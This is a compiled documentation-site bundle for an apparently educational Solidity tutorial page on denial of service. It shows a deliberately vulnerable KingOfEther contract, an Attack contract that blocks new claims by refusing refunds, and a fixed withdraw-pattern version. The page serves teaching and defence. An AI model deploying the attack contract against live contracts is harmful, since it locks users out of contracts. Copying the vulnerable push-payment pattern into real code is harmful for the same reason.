"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[3214],{3905:function(e,n,t){t.d(n,{Zo:function(){return u},kt:function(){return d}});var r=t(7294);function i(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){i(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function l(e,n){if(null==e)return{};var t,r,i=function(e,n){if(null==e)return{};var t,r,i={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(i[t]=e[t]);return i}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(i[t]=e[t])}return i}var c=r.createContext({}),s=function(e){var n=r.useContext(c),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},u=function(e){var n=s(e.components);return r.createElement(c.Provider,{value:n},e.children)},p={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},f=r.forwardRef((function(e,n){var t=e.components,i=e.mdxType,a=e.originalType,c=e.parentName,u=l(e,["components","mdxType","originalType","parentName"]),f=s(t),d=i,m=f["".concat(c,".").concat(d)]||f[d]||p[d]||a;return t?r.createElement(m,o(o({ref:n},u),{},{components:t})):r.createElement(m,o({ref:n},u))}));function d(e,n){var t=arguments,i=n&&n.mdxType;if("string"==typeof e||i){var a=t.length,o=new Array(a);o[0]=f;var l={};for(var c in n)hasOwnProperty.call(n,c)&&(l[c]=n[c]);l.originalType=e,l.mdxType="string"==typeof e?e:i,o[1]=l;for(var s=2;s<a;s++)o[s]=t[s];return r.createElement.apply(null,o)}return r.createElement.apply(null,t)}f.displayName="MDXCreateElement"},2871:function(e,n,t){t.r(n),t.d(n,{contentTitle:function(){return c},default:function(){return f},frontMatter:function(){return l},metadata:function(){return s},toc:function(){return u}});var r=t(7462),i=t(3366),a=(t(7294),t(3905)),o=["components"],l={title:"Denial of Service",version:"0.8.10",description:"An example of denial of service hack in Solidity"},c=void 0,s={unversionedId:"solidity/example/DenialOfSevice",id:"solidity/example/DenialOfSevice",isDocsHomePage:!1,title:"Denial of Service",description:"An example of denial of service hack in Solidity",source:"@site/docs/solidity/example/DenialOfSevice.md",sourceDirName:"solidity/example",slug:"/solidity/example/DenialOfSevice",permalink:"/rooctblog/docs/solidity/example/DenialOfSevice",tags:[],version:"current",frontMatter:{title:"Denial of Service",version:"0.8.10",description:"An example of denial of service hack in Solidity"},sidebar:"docs",previous:{title:"DelegatecallAttack",permalink:"/rooctblog/docs/solidity/example/DelegateCallAtack"},next:{title:"Echidna",permalink:"/rooctblog/docs/solidity/example/Echidna"}},u=[{value:"Vulnerability",id:"vulnerability",children:[]},{value:"Preventative Techniques",id:"preventative-techniques",children:[]}],p={toc:u};function f(e){var n=e.components,t=(0,i.Z)(e,o);return(0,a.kt)("wrapper",(0,r.Z)({},p,t,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h3",{id:"vulnerability"},"Vulnerability"),(0,a.kt)("p",null,"There are many ways to attack a smart contract to make it unusable."),(0,a.kt)("p",null,"One exploit we introduce here is denial of service by making the function to send Ether fail."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-solidity"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\n/*\nThe goal of KingOfEther is to become the king by sending more Ether than\nthe previous king. Previous king will be refunded with the amount of Ether\nhe sent.\n*/\n\n/*\n1. Deploy KingOfEther\n2. Alice becomes the king by sending 1 Ether to claimThrone().\n2. Bob becomes the king by sending 2 Ether to claimThrone().\n   Alice receives a refund of 1 Ether.\n3. Deploy Attack with address of KingOfEther.\n4. Call attack with 3 Ether.\n5. Current king is the Attack contract and no one can become the new king.\n\nWhat happened?\nAttack became the king. All new challenge to claim the throne will be rejected\nsince Attack contract does not have a fallback function, denying to accept the\nEther sent from KingOfEther before the new king is set.\n*/\n\ncontract KingOfEther {\n    address public king;\n    uint public balance;\n\n    function claimThrone() external payable {\n        require(msg.value > balance, "Need to pay more to become the king");\n\n        (bool sent, ) = king.call{value: balance}("");\n        require(sent, "Failed to send Ether");\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n}\n\ncontract Attack {\n    KingOfEther kingOfEther;\n\n    constructor(KingOfEther _kingOfEther) {\n        kingOfEther = KingOfEther(_kingOfEther);\n    }\n\n    // You can also perform a DOS by consuming all gas using assert.\n    // This attack will work even if the calling contract does not check\n    // whether the call was successful or not.\n    //\n    // function () external payable {\n    //     assert(false);\n    // }\n\n    function attack() public payable {\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n}\n\n')),(0,a.kt)("h3",{id:"preventative-techniques"},"Preventative Techniques"),(0,a.kt)("p",null,"One way to prevent this is to allow the users to withdraw their Ether instead of sending it."),(0,a.kt)("p",null,"Here is a example."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-solidity"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\ncontract KingOfEther {\n    address public king;\n    uint public balance;\n    mapping(address => uint) public balances;\n\n    function claimThrone() external payable {\n        require(msg.value > balance, "Need to pay more to become the king");\n\n        balances[king] += balance;\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n\n    function withdraw() public {\n        require(msg.sender != king, "Current king cannot withdraw");\n\n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call{value: amount}("");\n        require(sent, "Failed to send Ether");\n    }\n}\n\n')))}f.isMDXComponent=!0}}]);